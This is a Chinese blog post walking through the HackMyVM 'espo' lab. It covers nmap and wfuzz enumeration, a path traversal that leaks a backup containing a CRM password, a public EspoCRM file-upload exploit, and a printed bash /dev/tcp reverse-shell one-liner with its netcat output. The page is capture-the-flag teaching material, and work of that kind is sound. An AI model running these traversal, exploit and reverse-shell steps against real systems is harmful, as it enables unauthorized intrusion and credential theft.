<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://7r1umph.top/css/primer.css' rel='stylesheet' />
    <link href='https://7r1umph.top/css/matrix.css' rel='stylesheet' /><script src='https://7r1umph.top/plugins/theme.js'></script><script src='https://7r1umph.top/plugins/StatsSidebar.js'></script>
    <link rel="icon" href="https://7r1umph.top/image/20250320200557660.ico">
<meta name="description" content="# hmv_espo

# 0.简介

**靶机**：[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
**难度**：黄色
**目标 IP**：192.168.205.236
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
Nmap scan report for 192.168.205.236
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
```

---

# 2.踩点

![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)

是个登录栏，搜索一下有没有什么漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.236                                     
http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit EspoCRM
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                 
```

只有权限提升漏洞，但是我们没有用户。">
<meta property="og:title" content="hmv_espo">
<meta property="og:description" content="# hmv_espo

# 0.简介

**靶机**：[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
**难度**：黄色
**目标 IP**：192.168.205.236
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
Nmap scan report for 192.168.205.236
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
```

---

# 2.踩点

![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)

是个登录栏，搜索一下有没有什么漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.236                                     
http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit EspoCRM
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                 
```

只有权限提升漏洞，但是我们没有用户。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_espo.html">
<meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
<title>hmv_espo</title>



</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}

</style>




<body>
    <div id="header">
<h1 class="postTitle">hmv_espo</h1>
<div class="title-right">
    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/19" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><h1>hmv_espo</h1>
<h1>0.简介</h1>
<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=espo" rel="nofollow">hackmyvm - espo</a><br>
<strong>难度</strong>：黄色<br>
<strong>目标 IP</strong>：192.168.205.236<br>
<strong>本机 IP</strong>：192.168.205.141</p>
<hr>
<h1>1.扫描</h1>
<p><code class="notranslate">nmap</code>起手</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
Nmap scan report for 192.168.205.236
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
</code></pre>
<hr>
<h1>2.踩点</h1>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3"><img src="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3" alt="image" style="max-width: 100%;"></a></p>
<p>是个登录栏，搜索一下有没有什么漏洞</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.236                                     
http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit EspoCRM
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                 
</code></pre>
<p>只有权限提升漏洞，但是我们没有用户。爆破一下目录</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.236 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.236
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/admin/]
/install              (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/install/]
/api                  (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/api/]
/index.php            (Status: 200) [Size: 2480]
/portal               (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/portal/]
/client               (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/client/]
/robots.txt           (Status: 200) [Size: 26]
Progress: 42982 / 311425 (13.80%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 44082 / 311425 (14.15%)
===============================================================
Finished
===============================================================
                                 
</code></pre>
<p>发现一点有意思的东西</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51"><img src="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51" alt="image" style="max-width: 100%;"></a></p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51"><img src="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51" alt="image" style="max-width: 100%;"></a></p>
<p>貌似可以通过绕过读取文件夹外的文件，我们爆破试试</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u "http://192.168.205.236/admin../FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000003:   301        7 L      11 W       162 Ch      "admin"                                                             
000004255:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   
000008002:   301        7 L      11 W       162 Ch      "_oldsite"                                                          
000030014:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   
000059104:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   

Total time: 0
Processed Requests: 62284
Filtered Requests: 62279
Requests/sec.: 0

              
</code></pre>
<p>确实可以，我们继续爆破</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u "http://192.168.205.236/admin../_oldsite/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../_oldsite/FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000167:   200        11 L     79 W       540 Ch      "info"                                                              
000004255:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          
000030014:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          
000059104:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          

Total time: 34.86630
Processed Requests: 62284
Filtered Requests: 62280
Requests/sec.: 1786.366

                                           
</code></pre>
<p>有个文件，我们查看一下</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.236/admin../_oldsite/info
# Backup Configuration Settings
# This configuration file dictates the backup protocols for critical data storage.

# Directory for storing backup files
# All backup files are stored in compressed ZIP format for efficient space usage and security.
# Ensure that backups are regularly updated and verified for data integrity.

backup_directory: /admin/_oldsite
backup_format: zip
# Note: The backup directory is designated for ZIP file backups only. 
# Regular maintenance and checks are required to ensure data consistency and reliability.
                                                                                            
翻译
#备份配置设置
#该配置文件规定了关键数据存储的备份协议。
#备份文件存放目录
#所有备份文件都以压缩ZIP格式存储，以提高空间使用效率和安全性。
确保定期更新备份并验证数据完整性。
backup_directory:/admin/_oldsite
backup_format:zip
注意：指定的备份目录仅用于ZIP文件备份。
#需要定期维护和检查，确保数据的一致性和可靠性。
</code></pre>
<p>告诉了我们会保存备注文件，并且备份文件会以.zip为后缀，我们根据信息爆破一下</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
└─$ wfuzz -u "http://192.168.205.236/admin../_oldsite/FUZZ.zip" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../_oldsite/FUZZ.zip
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000066:   200        139379   1377104    36126245    "backup"                                                            
                         L       W          Ch                                                                              

Total time: 36.69276
Processed Requests: 62284
Filtered Requests: 62283
Requests/sec.: 1697.446

                             
</code></pre>
<p>我们把备份文件下载下来</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
└─$ wget http://192.168.205.236/admin../_oldsite/backup.zip
--2025-01-08 13:40:14--  http://192.168.205.236/admin../_oldsite/backup.zip
正在连接 192.168.205.236:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：37975754 (36M) [application/zip]
正在保存至: “backup.zip”

backup.zip                        100%[============================================================&gt;]  36.22M  --.-KB/s  用时 0.08s   

2025-01-08 13:40:14 (464 MB/s) - 已保存 “backup.zip” [37975754/37975754])

                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ unzip backup.zip 

┌──(kali㉿kali)-[~/test/tmp]
└─$ ls
application  bootstrap.php    command.php  daemon.php     extension.php  install      public       vendor
backup.zip   clear_cache.php  cron.php     data           html           LICENSE.txt  rebuild.php  web.config
bin          client           custom       EspoCRM-7.2.4  index.php      preload.php  upgrade.php  websocket.php
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd data 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/data]
└─$ ls -la
总计 44
drwxrwxr-x  7 kali kali 4096 2023年12月 4日 .
drwxrwxr-x 12 kali kali 4096  1月 8日 13:40 ..
drwxrwxr-x  3 kali kali 4096 2023年12月 4日 .backup
drwxrwxr-x  3 kali kali 4096 2023年12月 4日 cache
-rw-rw-r--  1 kali kali  972 2023年12月 4日 config-internal.php
-rw-rw-r--  1 kali kali 5711 2023年12月 4日 config.php
-rw-rw-r--  1 kali kali    1 2023年12月 4日 .data
drwxr-xr-x  2 kali kali 4096 2023年12月 4日 logs
drwxrwxr-x  2 kali kali 4096 2023年12月 4日 tmp
drwxrwxr-x  4 kali kali 4096 2023年12月 4日 upload
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/data]
└─$ cat config.php                                            
&lt;?php
return [
  'useCache' =&gt; true,
  'jobMaxPortion' =&gt; 15,
  'jobRunInParallel' =&gt; false,
  'jobPoolConcurrencyNumber' =&gt; 8,
  'daemonMaxProcessNumber' =&gt; 5,
  'daemonInterval' =&gt; 10,
  'daemonProcessTimeout' =&gt; 36000,
  'recordsPerPage' =&gt; 20,
  'recordsPerPageSmall' =&gt; 5,
  'recordsPerPageSelect' =&gt; 10,
  'applicationName' =&gt; 'EspoCRM',
  'version' =&gt; '7.2.4',
  'timeZone' =&gt; 'UTC',
  'dateFormat' =&gt; 'DD.MM.YYYY',
  'timeFormat' =&gt; 'HH:mm',
  'weekStart' =&gt; 0,
  'thousandSeparator' =&gt; ',',
  'decimalMark' =&gt; '.',
  'exportDelimiter' =&gt; ',',
  'currencyList' =&gt; [
    0 =&gt; 'EUR'
  ],
  'defaultCurrency' =&gt; 'EUR',
  'baseCurrency' =&gt; 'EUR',
  'currencyRates' =&gt; [],
  'outboundEmailIsShared' =&gt; true,
  'outboundEmailFromName' =&gt; 'EspoCRM',
  'outboundEmailFromAddress' =&gt; '',
  'smtpServer' =&gt; '',
  'smtpPort' =&gt; 25,
  'smtpAuth' =&gt; true,
  'smtpSecurity' =&gt; '',
  'smtpUsername' =&gt; 'admin',
  'smtpPassword' =&gt; '39Ue4kcVJ#YpaAV24CNmbWU',
  'language' =&gt; 'en_US',
  'authenticationMethod' =&gt; 'Espo',
  'globalSearchEntityList' =&gt; [
    0 =&gt; 'Account',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Opportunity'
  ],
  'tabList' =&gt; [
    0 =&gt; 'Account',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Opportunity',
    4 =&gt; 'Case',
    5 =&gt; 'Email',
    6 =&gt; 'Calendar',
    7 =&gt; 'Meeting',
    8 =&gt; 'Call',
    9 =&gt; 'Task',
    10 =&gt; '_delimiter_',
    11 =&gt; 'Document',
    12 =&gt; 'Campaign',
    13 =&gt; 'KnowledgeBaseArticle',
    14 =&gt; 'Stream',
    15 =&gt; 'User'
  ],
  'quickCreateList' =&gt; [
    0 =&gt; 'Account',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Opportunity',
    4 =&gt; 'Meeting',
    5 =&gt; 'Call',
    6 =&gt; 'Task',
    7 =&gt; 'Case',
    8 =&gt; 'Email'
  ],
  'exportDisabled' =&gt; false,
  'adminNotifications' =&gt; true,
  'adminNotificationsNewVersion' =&gt; true,
  'adminNotificationsCronIsNotConfigured' =&gt; true,
  'adminNotificationsNewExtensionVersion' =&gt; true,
  'assignmentEmailNotifications' =&gt; false,
  'assignmentEmailNotificationsEntityList' =&gt; [
    0 =&gt; 'Lead',
    1 =&gt; 'Opportunity',
    2 =&gt; 'Task',
    3 =&gt; 'Case'
  ],
  'assignmentNotificationsEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call',
    2 =&gt; 'Task',
    3 =&gt; 'Email'
  ],
  'portalStreamEmailNotifications' =&gt; true,
  'streamEmailNotificationsEntityList' =&gt; [
    0 =&gt; 'Case'
  ],
  'streamEmailNotificationsTypeList' =&gt; [
    0 =&gt; 'Post',
    1 =&gt; 'Status',
    2 =&gt; 'EmailReceived'
  ],
  'emailNotificationsDelay' =&gt; 30,
  'emailMessageMaxSize' =&gt; 10,
  'notificationsCheckInterval' =&gt; 10,
  'maxEmailAccountCount' =&gt; 2,
  'followCreatedEntities' =&gt; false,
  'b2cMode' =&gt; false,
  'theme' =&gt; 'Espo',
  'themeParams' =&gt; (object) [
    'navbar' =&gt; 'side'
  ],
  'massEmailMaxPerHourCount' =&gt; 100,
  'massEmailVerp' =&gt; false,
  'personalEmailMaxPortionSize' =&gt; 50,
  'inboundEmailMaxPortionSize' =&gt; 50,
  'emailAddressLookupEntityTypeList' =&gt; [
    0 =&gt; 'User',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Account'
  ],
  'authTokenLifetime' =&gt; 0,
  'authTokenMaxIdleTime' =&gt; 48,
  'userNameRegularExpression' =&gt; '[^a-z0-9\\-@_\\.\\s]',
  'addressFormat' =&gt; 1,
  'displayListViewRecordCount' =&gt; true,
  'dashboardLayout' =&gt; [
    0 =&gt; (object) [
      'name' =&gt; 'My Espo',
      'layout' =&gt; [
        0 =&gt; (object) [
          'id' =&gt; 'default-activities',
          'name' =&gt; 'Activities',
          'x' =&gt; 2,
          'y' =&gt; 2,
          'width' =&gt; 2,
          'height' =&gt; 4
        ],
        1 =&gt; (object) [
          'id' =&gt; 'default-stream',
          'name' =&gt; 'Stream',
          'x' =&gt; 0,
          'y' =&gt; 0,
          'width' =&gt; 2,
          'height' =&gt; 4
        ]
      ]
    ]
  ],
  'calendarEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call',
    2 =&gt; 'Task'
  ],
  'activitiesEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call'
  ],
  'historyEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call',
    2 =&gt; 'Email'
  ],
  'busyRangesEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call'
  ],
  'emailAutoReplySuppressPeriod' =&gt; '2 hours',
  'emailAutoReplyLimit' =&gt; 5,
  'cleanupJobPeriod' =&gt; '1 month',
  'cleanupActionHistoryPeriod' =&gt; '15 days',
  'cleanupAuthTokenPeriod' =&gt; '1 month',
  'currencyFormat' =&gt; 2,
  'currencyDecimalPlaces' =&gt; 2,
  'aclAllowDeleteCreated' =&gt; false,
  'aclAllowDeleteCreatedThresholdPeriod' =&gt; '24 hours',
  'attachmentUploadMaxSize' =&gt; 256,
  'attachmentUploadChunkSize' =&gt; 4,
  'inlineAttachmentUploadMaxSize' =&gt; 20,
  'textFilterUseContainsForVarchar' =&gt; false,
  'tabColorsDisabled' =&gt; false,
  'massPrintPdfMaxCount' =&gt; 50,
  'emailKeepParentTeamsEntityList' =&gt; [
    0 =&gt; 'Case'
  ],
  'streamEmailWithContentEntityTypeList' =&gt; [
    0 =&gt; 'Case'
  ],
  'recordListMaxSizeLimit' =&gt; 200,
  'noteDeleteThresholdPeriod' =&gt; '1 month',
  'noteEditThresholdPeriod' =&gt; '7 days',
  'emailForceUseExternalClient' =&gt; false,
  'useWebSocket' =&gt; false,
  'auth2FAMethodList' =&gt; [
    0 =&gt; 'Totp'
  ],
  'personNameFormat' =&gt; 'firstLast',
  'newNotificationCountInTitle' =&gt; false,
  'pdfEngine' =&gt; 'Tcpdf',
  'smsProvider' =&gt; NULL,
  'defaultFileStorage' =&gt; 'EspoUploadDir',
  'ldapUserNameAttribute' =&gt; 'sAMAccountName',
  'ldapUserFirstNameAttribute' =&gt; 'givenName',
  'ldapUserLastNameAttribute' =&gt; 'sn',
  'ldapUserTitleAttribute' =&gt; 'title',
  'ldapUserEmailAddressAttribute' =&gt; 'mail',
  'ldapUserPhoneNumberAttribute' =&gt; 'telephoneNumber',
  'ldapUserObjectClass' =&gt; 'person',
  'ldapPortalUserLdapAuth' =&gt; false,
  'passwordGenerateLength' =&gt; 10,
  'massActionIdleCountThreshold' =&gt; 100,
  'exportIdleCountThreshold' =&gt; 1000,
  'cacheTimestamp' =&gt; 1701712486,
  'microtime' =&gt; 1701712486.097623,
  'siteUrl' =&gt; 'http://espo.hmv',
  'fullTextSearchMinLength' =&gt; 4,
  'appTimestamp' =&gt; 1701712486,
  'maintenanceMode' =&gt; NULL,
  'cronDisabled' =&gt; NULL
];
                                                    
</code></pre>
<p>在data文件夹中发现了配置文件，并且配置文件中有账号和密码，我们尝试登录</p>
<p>成功进入<code class="notranslate">EspoCRM</code>,查看一下他版本信息</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22"><img src="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22" alt="image" style="max-width: 100%;"></a></p>
<p>搜索该版本有没有漏洞。通过搜索发现存在<a href="https://github.com/josemlwdf/CVE-2023-5965">上传文件漏洞</a>，我们利用一下</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/josemlwdf/CVE-2023-5965.git  
正克隆到 'CVE-2023-5965'...
remote: Enumerating objects: 37, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (34/34), done.
remote: Total 37 (delta 14), reused 0 (delta 0), pack-reused 0 (from 0)
接收对象中: 100% (37/37), 12.33 KiB | 287.00 KiB/s, 完成.
处理 delta 中: 100% (14/14), 完成.
                                             
</code></pre>
<p>发现第一个通过更新无效，尝试第二个上传插件，成功上传并有反馈</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201"><img src="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201" alt="image" style="max-width: 100%;"></a></p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1"><img src="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1" alt="image" style="max-width: 100%;"></a></p>
<p>弹一个反弹shell回来</p>
<pre lang="bash" class="notranslate"><code class="notranslate"># 执行语句
bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1"

┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 35578
bash: cannot set terminal process group (509): Inappropriate ioctl for device
bash: no job control in this shell
www-data@espo:~/html/public$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<hr>
<h1>3. 获得稳定的 Shell</h1>
<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
</code></pre>
<hr>
<h1>4.提权</h1>
<pre lang="bash" class="notranslate"><code class="notranslate">www-data@espo:~/html/public$ ls -la
total 36
drwxr-xr-x  5 www-data www-data 4096 Jan  8 06:52 .
drwxr-xr-x 12 www-data www-data 4096 Dec  4  2023 ..
drwxr-xr-x  3 www-data www-data 4096 Dec  4  2023 api
-rw-r--r--  1 www-data www-data 1689 Dec  4  2023 index.php
drwxr-xr-x  5 www-data www-data 4096 Dec  4  2023 install
-rw-r--r--  1 www-data www-data 1660 Dec  4  2023 oauth-callback.php
drwxr-xr-x  2 www-data www-data 4096 Dec  4  2023 portal
-rw-r--r--  1 www-data www-data   26 Dec  4  2023 robots.txt
-rw-r--r--  1 www-data www-data  302 Jan  8 06:52 webshell.php
www-data@espo:~/html/public$ cd ..
www-data@espo:~/html$ ls -la
total 136
drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 .
drwxr-xr-x  4 root     root      4096 Dec  4  2023 ..
-rw-r--r--  1 www-data www-data  1153 Dec  4  2023 .htaccess
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 EspoCRM-7.2.4
-rw-r--r--  1 www-data www-data 35819 Dec  4  2023 LICENSE.txt
drwxr-xr-x  3 www-data www-data  4096 Dec  4  2023 application
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 bin
-rw-r--r--  1 www-data www-data  1498 Dec  4  2023 bootstrap.php
-rw-r--r--  1 www-data www-data  1543 Dec  4  2023 clear_cache.php
drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 client
-rw-r--r--  1 www-data www-data  1536 Dec  4  2023 command.php
-rw-r--r--  1 www-data www-data  1531 Dec  4  2023 cron.php
drwxrwxr-x  3 www-data www-data  4096 Dec  4  2023 custom
-rw-r--r--  1 www-data www-data  1535 Dec  4  2023 daemon.php
drwxrwxr-x  7 www-data www-data  4096 Jan  8 06:52 data
-rw-r--r--  1 www-data www-data  2812 Dec  4  2023 extension.php
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 html
-rw-r--r--  1 www-data www-data  3170 Dec  4  2023 index.php
drwxr-xr-x  4 www-data www-data  4096 Dec  4  2023 install
-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 preload.php
drwxr-xr-x  5 www-data www-data  4096 Jan  8 06:52 public
-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 rebuild.php
-rw-r--r--  1 www-data www-data  3034 Dec  4  2023 upgrade.php
drwxr-xr-x 39 www-data www-data  4096 Dec  4  2023 vendor
-rw-r--r--  1 www-data www-data  2534 Dec  4  2023 web.config
-rw-r--r--  1 www-data www-data  1541 Dec  4  2023 websocket.php
www-data@espo:~/html$ cd /home/
www-data@espo:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 Jan 24  2024 .
drwxr-xr-x 18 root   root   4096 Dec  4  2023 ..
drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 mandie
www-data@espo:/home$ cd mandie/
www-data@espo:/home/mandie$ ls -al
total 48
drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 .
drwxr-xr-x  3 root   root   4096 Jan 24  2024 ..
lrwxrwxrwx  1 root   root      9 Jan 26  2024 .bash_history -&gt; /dev/null
